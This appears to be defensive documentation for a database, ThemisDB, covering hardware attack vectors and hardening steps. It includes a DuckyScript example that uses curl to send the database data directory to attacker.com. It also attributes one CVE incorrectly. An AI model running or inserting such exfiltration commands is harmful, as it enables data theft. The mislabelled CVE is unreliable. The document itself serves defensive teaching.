# Hardware Attack Vectors – Overview and Protection Measures

**Date:** January 7, 2026  
**Version:** 1.0.0  
**Category:** 🔒 Security

---

## 📑 Table of Contents

- [Introduction](#introduction)
- [USB Attack Vectors](#usb-attack-vectors)
- [PCIe and DMA Attacks](#pcie-and-dma-attacks)
- [CPU Attacks](#cpu-attacks)
- [RAM Attacks](#ram-attacks)
- [Additional I/O Attack Vectors](#additional-io-attack-vectors)
- [Firmware and BIOS/UEFI Attacks](#firmware-and-biosuefi-attacks)
- [Countermeasures and Best Practices](#countermeasures-and-best-practices)
- [ThemisDB-Specific Hardening Measures](#themisdb-specific-hardening-measures)
- [Monitoring and Detection](#monitoring-and-detection)
- [Compliance and Standards](#compliance-and-standards)
- [See Also](#see-also)

---

## Introduction

Hardware attack vectors pose a unique threat to database systems as they often operate below the operating system level and can bypass traditional software security measures. For ThemisDB, which processes and stores sensitive data, a deep understanding of these attack vectors and corresponding protection measures is essential.

This document provides a comprehensive overview of hardware-level attack vectors on server infrastructure and demonstrates specific protection measures for ThemisDB deployments.

### Threat Classification

| Threat Category | Likelihood | Impact | Risk |
|-----------------|-----------|--------|------|
| USB Attacks | Medium-High | High | ⚠️ High |
| PCIe/DMA Attacks | Medium | Critical | 🔴 Critical |
| CPU Attacks | High | Medium-High | ⚠️ High |
| RAM Attacks | Low-Medium | Critical | ⚠️ High |
| Firmware Attacks | Low | Critical | 🟡 Medium |

---

## USB Attack Vectors

### Overview

USB ports represent one of the most common physical attack vectors as they are present in nearly all systems and easily accessible.

### Attack Types

#### 1. **BadUSB / Malicious HID**

**Description:** USB devices (e.g., manipulated keyboards, flash drives) with reprogrammed firmware that present themselves as input devices and automatically execute commands.

**Attack Scenario:**
```
1. Attacker places manipulated USB device in data center
2. Administrator inserts device (social engineering)
3. Device emulates keyboard and executes commands:
   - Download and execution of malware
   - Credential exfiltration
   - Backdoor installation
```

**Threat to ThemisDB:**
- Direct access to server shell
- Extraction of configuration files (`config.yaml`)
- Access to secrets/keys
- Manipulation of RocksDB data

**Severity:** 🔴 **CRITICAL**

#### 2. **USB Rubber Ducky**

Specialized BadUSB device with pre-programmed attack scripts (DuckyScript).

**Example Attack on ThemisDB:**
```duckyscript
REM ThemisDB Data Exfiltration
DELAY 1000
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 500
STRING curl http://attacker.com/exfil -d @/var/lib/themisdb/data/*
ENTER
```

**Severity:** 🔴 **CRITICAL**

#### 3. **USB Killers**

Hardware devices that generate electrical surges to physically destroy systems.

**Threat:** Denial-of-Service, hardware destruction  
**Severity:** 🟡 **MEDIUM** (primarily physical damage, no data exfiltration)

#### 4. **USB Keyloggers**

Hardware keyloggers between keyboard and USB port to record all inputs.

**Threat:** Passwords, admin commands, encryption keys  
**Severity:** 🔴 **CRITICAL**

### Protection Measures

#### Preventive Measures

1. **USB Port Disabling**
   ```bash
   # Linux: Blacklist USB Storage
   echo "blacklist usb-storage" >> /etc/modprobe.d/blacklist.conf
   echo "install usb-storage /bin/true" >> /etc/modprobe.d/blacklist.conf
   update-initramfs -u
   ```

2. **USBGuard – Fine-grained USB Device Control**
   ```bash
   # Installation
   apt-get install usbguard
   
   # Whitelist only known devices
   usbguard generate-policy > /etc/usbguard/rules.conf
   systemctl enable --now usbguard
   ```

3. **BIOS/UEFI-Level USB Blocking**
   - Disable USB ports in BIOS
   - Enable BIOS password protection
   - Enable Secure Boot

4. **Physical Security**
   - USB port blockers (physical covers)
   - Data center with access controls
   - Video surveillance

#### Detective Measures

```bash
# USB device monitoring with auditd
auditctl -w /dev/bus/usb -p wa -k usb_events
auditctl -w /sys/bus/usb/devices/ -p wa -k usb_device_changes
```

---

## PCIe and DMA Attacks

### Overview

PCIe (Peripheral Component Interconnect Express) enables Direct Memory Access (DMA), allowing devices to access system memory directly – a powerful attack vector.

### Attack Types

#### 1. **DMA Attacks (Direct Memory Access)**

**Description:** PCIe devices can use DMA to directly access RAM, bypassing operating system controls.

**Attack Scenario:**
```
1. Attacker installs malicious PCIe card (e.g., network card)
2. Card uses DMA to read entire RAM
3. Extraction of:
   - Encryption keys from memory
   - ThemisDB data (unencrypted in RAM)
   - Admin credentials
```

**Tools:** PCILeech, Inception

**Threat to ThemisDB:**
- Direct access to RocksDB cache
- Extraction of DEK/KEK from memory
- Bypass of all software security measures

**Severity:** 🔴 **CRITICAL**

#### 2. **PCIe Option ROM Attacks**

PCIe devices have their own firmware (Option ROMs) that execute during boot – before the operating system.

**Threat:** Bootkits, rootkits, persistent backdoors  
**Severity:** 🔴 **CRITICAL**

#### 3. **Thunderbolt/USB4 DMA Attacks**

Thunderbolt/USB4 support PCIe tunneling, enabling external DMA access.

**Attack Scenario:**
```
1. Attacker connects Thunderbolt device
2. Device uses PCIe-over-Thunderbolt for DMA
3. "Thunderspy" / "Thunderclap" exploits
```

**Severity:** 🔴 **CRITICAL**

### Protection Measures

#### 1. **IOMMU (Input-Output Memory Management Unit)**

IOMMU isolates DMA accesses and prevents devices from arbitrarily accessing RAM.

**Activation (Intel VT-d):**
```bash
# GRUB configuration
vi /etc/default/grub
# Add:
GRUB_CMDLINE_LINUX="intel_iommu=on iommu=pt"

# Update GRUB
update-grub
reboot
```

**Activation (AMD-Vi):**
```bash
GRUB_CMDLINE_LINUX="amd_iommu=on iommu=pt"
```

**Verification:**
```bash
dmesg | grep -i iommu
# Should show: "IOMMU enabled"
```

#### 2. **Kernel DMA Protection (Windows 10+)**

Windows 10 (1803+) provides Kernel DMA Protection for Thunderbolt 3 devices.

**Check:**
```powershell
Get-WmiObject -Class Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
# Property: DmaProtectionStatus (1 = enabled)
```

#### 3. **Thunderbolt Security Levels**

```bash
# Linux: Set Thunderbolt Security Level
echo "user" > /sys/bus/thunderbolt/devices/0-0/security
# Levels: none (insecure), user, secure, dponly
```

#### 4. **PCIe Access Control Services (ACS)**

ACS prevents peer-to-peer DMA between PCIe devices.

```bash
# Check
lspci -vv | grep -i "access control"
```

#### 5. **Physical Security**

- Seal PCIe slots with epoxy resin (permanent solution)
- Enable chassis intrusion detection
- Lock server racks

---

## CPU Attacks

### Overview

Modern CPUs are vulnerable to various side-channel attacks resulting from microarchitectural features like speculative execution.

### Attack Types

#### 1. **Spectre (CVE-2017-5753, CVE-2017-5715)**

**Description:** Exploits speculative execution to read across boundaries and extract data from other processes.

**Attack Principle:**
```
1. Train branch prediction (Speculative Execution)
2. Trigger speculative access to sensitive data
3. Read data via cache timing side-channel
```

**Threat to ThemisDB:**
- Leakage of encryption keys
- Access to data from other users/sessions
- Cross-VM attacks in cloud environments

**Severity:** ⚠️ **HIGH**

#### 2. **Meltdown (CVE-2017-5754)**

**Description:** Reading kernel memory from user space by exploiting out-of-order execution.

**Threat:** Kernel passwords, keys, database cache  
**Severity:** ⚠️ **HIGH**

#### 3. **MDS (Microarchitectural Data Sampling)**

- **RIDL** (Rogue In-Flight Data Load)
- **Fallout** (Store Buffer Data Sampling)
- **ZombieLoad**

**Description:** Sampling data from CPU-internal buffers (load/store buffers, fill buffers).

**Severity:** ⚠️ **HIGH**

#### 4. **Intel SGX Attacks**

- **Plundervolt**: Voltage manipulation to bypass SGX fences
- **SGAxe**: Cache attack on SGX enclaves

**Severity:** 🟡 **MEDIUM** (only relevant when using SGX)

### Protection Measures

#### 1. **Microcode Updates**

```bash
# Intel
apt-get install intel-microcode

# AMD
apt-get install amd64-microcode

# Verification
dmesg | grep microcode
```

#### 2. **Enable Kernel Mitigations**

```bash
# /etc/default/grub
GRUB_CMDLINE_LINUX="spectre_v2=on spec_store_bypass_disable=on l1tf=full,force mds=full,nosmt"

update-grub
reboot
```

**Parameter Explanation:**
- `spectre_v2=on`: Retpoline protection
- `spec_store_bypass_disable=on`: SSBD (Speculative Store Bypass Disable)
- `l1tf=full,force`: L1TF mitigations
- `mds=full,nosmt`: MDS mitigations (disables SMT/Hyper-Threading)

#### 3. **Disable SMT/Hyper-Threading**

```bash
# Runtime
echo off > /sys/devices/system/cpu/smt/control

# Permanent (BIOS)
# Disable Hyper-Threading in BIOS/UEFI
```

**Trade-off:** Performance loss (20-30%), but increased security

#### 4. **Kernel Page-Table Isolation (KPTI)**

Automatically enabled for Meltdown protection (since Kernel 4.14+).

```bash
# Verification
cat /sys/devices/system/cpu/vulnerabilities/*
```

#### 5. **Software Side-Channel Hardening**

**For ThemisDB Code:**
```cpp
// Constant-time comparison for cryptography
bool secure_compare(const std::string& a, const std::string& b) {
    if (a.size() != b.size()) return false;
    
    volatile unsigned char result = 0;
    for (size_t i = 0; i < a.size(); i++) {
        result |= a[i] ^ b[i];
    }
    return result == 0;
}
```

---

## RAM Attacks

### Overview

RAM contains unencrypted data and keys during runtime, making it an attractive attack target.

### Attack Types

#### 1. **Cold Boot Attack**

**Description:** DRAM remanence – memory retains data for seconds to minutes after power loss.

**Attack Scenario:**
```
1. Freeze system (spray with liquefied gas)
2. Remove RAM modules
3. Insert into analysis system
4. Create RAM dump
5. Extract encryption keys
```

**Tools:** Inception, BootIce

**Threat to ThemisDB:**
- DEK/KEK extraction from RAM
- RocksDB cache dump
- Session tokens

**Severity:** 🟡 **MEDIUM** (requires physical access)

#### 2. **Rowhammer**

**Description:** Bit flips in DRAM by repeatedly reading adjacent memory rows.

**Attack Scenario:**
```cpp
// Pseudo-code
while(true) {
    *addr1 = value;  // Row hammer
    *addr2 = value;
    clflush(addr1);
    clflush(addr2);
}
// Causes bit flips in adjacent rows
```

**Threat:** Privilege escalation, code injection  
**Severity:** 🟡 **MEDIUM**

**Variants:**
- **RAMBleed**: Data leakage via Rowhammer
- **TRRespass**: New Rowhammer attacks (2020+)
- **SMASH**: Synchronous DRAM Refresh

### Protection Measures

#### 1. **Memory Encryption (AMD SME/SEV, Intel TME)**

**AMD Secure Memory Encryption (SME):**
```bash
# GRUB configuration
GRUB_CMDLINE_LINUX="mem_encrypt=on"

# Verification
dmesg | grep -i SME
```

**Intel Total Memory Encryption (TME):**
- Available from Intel Ice Lake Server CPUs
- Automatically enabled (no configuration)

#### 2. **ECC Memory (Error Correcting Code)**

Protects against bit flips (Rowhammer).

```bash
# Check ECC status
dmidecode -t memory | grep -i ecc
```

**Recommendation:** Always use ECC RAM for production systems

#### 3. **Memory Scrubbing**

Periodic overwriting of RAM regions.

```bash
# Linux Kernel Memory Scrubbing (automatic with ECC)
cat /sys/devices/system/edac/mc/mc0/ce_count
```

#### 4. **Application-Level Memory Protection**

**For ThemisDB:**
```cpp
// Memory locking for sensitive data
void lockMemory(void* addr, size_t len) {
    mlock(addr, len);  // Prevent swapping
    sodium_mlock(addr, len);  // Libsodium Memory Protection
}

void secureWipe(void* addr, size_t len) {
    sodium_memzero(addr, len);  // Secure wiping
}
```

---

## Additional I/O Attack Vectors

### 1. **Thunderbolt/Firewire DMA**

**Description:** Thunderbolt and Firewire enable DMA over external ports.

**Severity:** 🔴 **CRITICAL**

**Protection Measures:**
- Thunderbolt Security Levels (see [PCIe Attacks](#pcie-and-dma-attacks))
- Disable Firewire drivers:
  ```bash
  echo "blacklist firewire-core" >> /etc/modprobe.d/blacklist.conf
  echo "blacklist firewire-ohci" >> /etc/modprobe.d/blacklist.conf
  ```

### 2. **IPMI/BMC (Baseboard Management Controller)**

**Description:** Out-of-band management interface with direct hardware access.

**Attack Vectors:**
- Default credentials (common: `ADMIN/ADMIN`)
- Known vulnerabilities (e.g., "IPMI 2.0 RAKP Authentication Bypass")
- Direct RAM access via IPMI interface

**Severity:** 🔴 **CRITICAL**

**Protection Measures:**
```bash
# Secure IPMI configuration
ipmitool user set password 2 "<strong-password>"
ipmitool lan set 1 access off  # Disable network access

# IPMI only via dedicated management VLAN
# Firewall rule: Only allow admin IPs
iptables -A INPUT -p udp --dport 623 -s <admin-ip> -j ACCEPT
iptables -A INPUT -p udp --dport 623 -j DROP
```

### 3. **Serial/UART Access**

**Description:** Serial consoles often provide unfiltered boot access.

**Protection Measures:**
- Disable serial console (GRUB):
  ```bash
  # GRUB_CMDLINE_LINUX does NOT contain: console=ttyS0
  ```
- Physical security: No external serial port

### 4. **JTAG/Debug Ports**

**Description:** Hardware debug interfaces for development.

**Threat:** Direct memory dump, code injection  
**Severity:** 🔴 **CRITICAL**

**Protection Measures:**
- Burn JTAG fuses (permanent)
- Make debug ports physically inaccessible
- Secure Boot with debug disable

---

## Firmware and BIOS/UEFI Attacks

### Overview

Firmware attacks operate below the operating system level and are difficult to detect.

### Attack Types

#### 1. **UEFI Bootkits / BIOS Rootkits**

**Description:** Malware in UEFI/BIOS firmware persists even after OS reinstallation.

**Examples:**
- LoJax (2018): First UEFI rootkit in the wild
- MosaicRegressor (2020): UEFI rootkit with TTP similarity to Chinese APT groups

**Severity:** 🔴 **CRITICAL**

#### 2. **Intel ME / AMD PSP Exploits**

- **Intel Management Engine (ME):** Subsystem with full hardware access
- **AMD Platform Security Processor (PSP):** AMD equivalent

**Known Vulnerabilities:**
- CVE-2017-5689: Intel ME Remote Exploit
- CVE-2018-3639: AMD PSP Exploit

**Severity:** 🔴 **CRITICAL**

### Protection Measures

#### 1. **Secure Boot**

```bash
# Check Secure Boot status
mokutil --sb-state

# Should be: SecureBoot enabled
```

#### 2. **UEFI Firmware Updates**

```bash
# fwupd for automatic firmware updates
apt-get install fwupd
fwupdmgr refresh
fwupdmgr update
```

#### 3. **BIOS/UEFI Write-Protection**

- Set BIOS password
- Enable SPI flash chip write-protect (hardware jumper)

#### 4. **TPM (Trusted Platform Module) Measured Boot**

```bash
# Check TPM 2.0
cat /sys/class/tpm/tpm0/tpm_version_major

# Boot attestation
tpm2_quote --pcr-list sha256:0,1,2,3,4,5,6,7
```

---

## Countermeasures and Best Practices

### Defense-in-Depth Strategy

```
┌─────────────────────────────────────────┐
│  Layer 7: Monitoring & Incident Response│  ← Logging, SIEM
├─────────────────────────────────────────┤
│  Layer 6: Firmware Security             │  ← Secure Boot, TPM
├─────────────────────────────────────────┤
│  Layer 5: CPU Mitigations               │  ← Microcode, KPTI
├─────────────────────────────────────────┤
│  Layer 4: Memory Protection             │  ← IOMMU, SME/TME
├─────────────────────────────────────────┤
│  Layer 3: I/O Access Control            │  ← USBGuard, ACS
├─────────────────────────────────────────┤
│  Layer 2: Physical Security             │  ← Locked Racks, Cameras
├─────────────────────────────────────────┤
│  Layer 1: Trusted Hardware              │  ← ECC RAM, Secure Supply Chain
└─────────────────────────────────────────┘
```

### General Hardening Measures

#### 1. **Hardware Hardening**

- [ ] Use ECC RAM (mandatory for production)
- [ ] CPUs with current microcode updates
- [ ] Trusted Platform Module (TPM 2.0)
- [ ] Self-Encrypting Drives (SEDs)
- [ ] Trusted supply chain

#### 2. **BIOS/UEFI Hardening**

- [ ] Enable Secure Boot
- [ ] Set BIOS password (Admin + User)
- [ ] Disable USB boot
- [ ] Disable PXE boot (except for diskless deployments)
- [ ] Enable Intel VT-d / AMD-Vi (IOMMU)
- [ ] Disable Hyper-Threading (for high-security environments)
- [ ] Disable legacy BIOS mode (UEFI only)

#### 3. **Operating System Hardening**

```bash
#!/bin/bash
# ThemisDB Hardware Security Hardening Script

# 1. Disable USB storage
echo "blacklist usb-storage" >> /etc/modprobe.d/blacklist-usb.conf
echo "install usb-storage /bin/true" >> /etc/modprobe.d/blacklist-usb.conf

# 2. Disable Firewire
echo "blacklist firewire-core" >> /etc/modprobe.d/blacklist-firewire.conf
echo "blacklist firewire-ohci" >> /etc/modprobe.d/blacklist-firewire.conf

# 3. Thunderbolt Security
echo "user" > /sys/bus/thunderbolt/devices/0-0/security 2>/dev/null || true

# 4. Enable IOMMU
if ! grep -q "intel_iommu=on" /etc/default/grub; then
    sed -i 's/GRUB_CMDLINE_LINUX="/GRUB_CMDLINE_LINUX="intel_iommu=on iommu=pt /' /etc/default/grub
    update-grub
fi

# 5. CPU Mitigations
if ! grep -q "spectre_v2=on" /etc/default/grub; then
    sed -i 's/GRUB_CMDLINE_LINUX="/GRUB_CMDLINE_LINUX="spectre_v2=on spec_store_bypass_disable=on l1tf=full,force mds=full /' /etc/default/grub
    update-grub
fi

# 6. Kernel parameters for memory security
sysctl -w kernel.yama.ptrace_scope=3
sysctl -w kernel.kptr_restrict=2
sysctl -w kernel.dmesg_restrict=1

# Persistent
cat >> /etc/sysctl.d/99-hardware-security.conf <<EOF
kernel.yama.ptrace_scope=3
kernel.kptr_restrict=2
kernel.dmesg_restrict=1
EOF

# 7. Disable swap (for in-memory databases)
swapoff -a
sed -i '/swap/d' /etc/fstab

echo "Hardware hardening complete. Reboot required."
```

---

## ThemisDB-Specific Hardening Measures

### 1. **Memory Protection for Encryption Keys**

```cpp
// include/security/memory_protection.h
#pragma once

#include <sodium.h>
#include <sys/mman.h>

namespace themis {
namespace security {

class SecureMemory {
public:
    // Allocate protected memory
    static void* allocateSecure(size_t size) {
        void* ptr = sodium_malloc(size);
        if (ptr) {
            sodium_mlock(ptr, size);  // Lock in RAM, prevent swapping
        }
        return ptr;
    }
    
    // Secure free
    static void freeSecure(void* ptr, size_t size) {
        if (ptr) {
            sodium_munlock(ptr, size);
            sodium_free(ptr);
        }
    }
    
    // Secure wipe
    static void secureWipe(void* ptr, size_t size) {
        sodium_memzero(ptr, size);
    }
};

} // namespace security
} // namespace themis
```

### 2. **Hardware Security Module (HSM) Integration**

See: [security_hsm.md](../../de/security/security_hsm.md)

**Recommended HSMs for ThemisDB:**
- **Thales Luna Network HSM**
- **Utimaco SecurityServer**
- **AWS CloudHSM** (for cloud deployments)

### 3. **Configuration: Hardware Security**

```yaml
# config/config.yaml
security:
  hardware:
    # Memory Protection
    secure_memory_wiping: true
    disable_swap: true
    lock_sensitive_memory: true
    
    # DMA Protection
    require_iommu: true
    verify_iommu_on_startup: true
    
    # CPU Security
    verify_microcode_version: true
    minimum_microcode_version:
      intel: "0x2006906"
      amd: "0x8701021"
    
    # Intrusion Detection
    enable_tampering_detection: true
    check_uefi_secure_boot: true
    
    # TPM Integration
    tpm_enabled: true
    tpm_pcr_validation:
      - 0  # BIOS
      - 1  # BIOS Configuration
      - 7  # Secure Boot

    # Physical Security Logging
    log_hardware_changes: true
    alert_on_chassis_intrusion: true
```

---

## Monitoring and Detection

### 1. **Hardware Change Detection**

```bash
# Cron job for hardware inventory
#!/bin/bash
# /etc/cron.hourly/hardware-inventory

CURRENT_HW=$(lshw -short -quiet | sha256sum)
BASELINE_HW=$(cat /var/lib/themisdb/hw_baseline.sha256)

if [ "$CURRENT_HW" != "$BASELINE_HW" ]; then
    logger -t themisdb-security "ALERT: Hardware configuration changed!"
    echo "$CURRENT_HW" > /var/lib/themisdb/hw_baseline.sha256.new
    # Trigger alert
    curl -X POST http://localhost:8765/api/v1/alerts \
        -H "Content-Type: application/json" \
        -d '{"type":"HARDWARE_CHANGE","severity":"HIGH"}'
fi
```

### 2. **USB Event Monitoring**

```bash
# auditd rule
-w /dev/bus/usb -p wa -k usb_events
-w /sys/bus/usb/devices/ -p wa -k usb_device_changes

# Log analysis
ausearch -k usb_events -ts recent
```

---

## Compliance and Standards

### BSI (German Federal Office for Information Security)

**Relevant BSI Guidelines:**
- **BSI IT-Grundschutz M 1.14**: Appropriate positioning of IT systems
- **BSI IT-Grundschutz M 1.15**: Securing doors and windows
- **BSI IT-Grundschutz M 4.68**: Secure Boot

### ISO 27001 Controls

**Physical Security:**
- **A.11.1**: Secure areas
- **A.11.2**: Access control

**Technical Security:**
- **A.12.2**: Protection from malware
- **A.12.6**: Technical vulnerability management

### NIST SP 800-53

**Relevant Controls:**
- **PE-3**: Physical Access Control
- **PE-5**: Access Control for Output Devices
- **SI-16**: Memory Protection

---

## See Also

### ThemisDB Security Documentation

- [Security Overview](README.md)
- [Security Hardening Guide](../../de/security/security_hardening.md)
- [Threat Model](../../de/security/security_threat_model.md)
- [HSM Integration](../../de/security/security_hsm.md)
- [Key Management](../../de/security/security_key_management.md)

### External Resources

**Hardware Security:**
- [Intel Security Advisories](https://www.intel.com/content/www/us/en/security-center/default.html)
- [AMD Security](https://www.amd.com/en/corporate/product-security)
- [NIST Hardware Security](https://csrc.nist.gov/projects/hardware-roots-of-trust)

**Tools:**
- [CHIPSEC](https://github.com/chipsec/chipsec) - Intel Security Testing
- [USBGuard](https://usbguard.github.io/) - USB Device Authorization

---

<div align="center">

**🔒 Hardware security is fundamental for ThemisDB**

[🚨 Security Policy](../../../SECURITY.md) · [📖 Security Docs](README.md)

</div>
